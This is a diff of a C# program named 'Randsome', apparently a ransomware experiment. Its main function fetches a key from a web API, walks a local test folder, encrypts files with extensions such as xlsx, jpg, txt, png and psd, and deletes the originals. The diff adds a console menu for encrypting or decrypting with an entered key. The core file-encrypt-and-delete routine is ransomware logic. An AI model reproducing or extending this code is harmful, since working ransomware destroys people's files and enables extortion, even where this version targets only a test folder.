@@ -70,13 +70,18 @@ namespace Randsome
         /// </summary>
         /// <param name="extention"></param>
         /// <returns></returns>
-        public static bool isEncryptionType(string extention)
+        public static bool IsEncryptionType(string extention, int fileSize = 0)
         {
-            if(extention == ".xlsx" || extention == ".jpg" || extention == ".txt")
+            if (extention == ".xlsx" || extention == ".jpg" || extention == ".txt" || extention == ".png" || extention == ".psd")
+            {
                 return true;
-            return false;
+            }
+            else
+            {
+                return false;
+            }
         }
-
+  
 
 
         /// <summary>
@@ -120,7 +125,8 @@ namespace Randsome
                 {
                     //Original
                     var originalExtention = Path.GetExtension(EncryptionList[i].path);
-                    if (isEncryptionType(originalExtention))
+                    Console.Write(EncryptionList[i].data.Length +"bytes");
+                    if (IsEncryptionType(originalExtention, EncryptionList[i].data.Length))
                     {
                         var encBytes = _Encrypt(EncryptionList[i].data);
                         System.IO.File.Delete(EncryptionList[i].path);
@@ -146,17 +152,36 @@ namespace Randsome
         }
         static void Main(string[] args)
         {
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine("input 'e' to test encryption.\n else For decryption, input 'd'.");
+            Console.ForegroundColor = ConsoleColor.White;
+            Console.Write("Input :");
 
-            WebReq(rand + api, (string json) =>
+            string input = Console.ReadLine();
+            if (input.ToLower() == "e")
             {
-                var mapper = LitJson.JsonMapper.ToObject(json);
-                string key = mapper["info"]["seed"].ToString();
+                WebReq(rand + api, (string json) =>
                 {
-                    decKey = key;
-                    FolderFinder(@"C:\Users\user\source\repos\Randsome\Randsome\bin\Debug\TestFolder");
-                    Proccess(ProccessMode.Encrypt);
-                }
-            });
+                    var mapper = LitJson.JsonMapper.ToObject(json);
+                    string key = mapper["info"]["seed"].ToString();
+                    {
+                        decKey = key;
+                        FolderFinder(@"C:\Users\user\source\repos\Randsome\Randsome\bin\Debug\TestFolder");
+                        Proccess(ProccessMode.Encrypt);
+                        Console.WriteLine("\n"+decKey);
+                    }
+                });
+            }
+            else if (input.ToLower() =="d")
+            {
+                Console.WriteLine("\n\n input decryption key. ");
+                Console.Write("Input : ");
+                decKey = Console.ReadLine();
+                FolderFinder(@"C:\Users\user\source\repos\Randsome\Randsome\bin\Debug\TestFolder");
+                Proccess(ProccessMode.Decrypt, decKey);      
+            }
+            return;
+         
         }
 
 
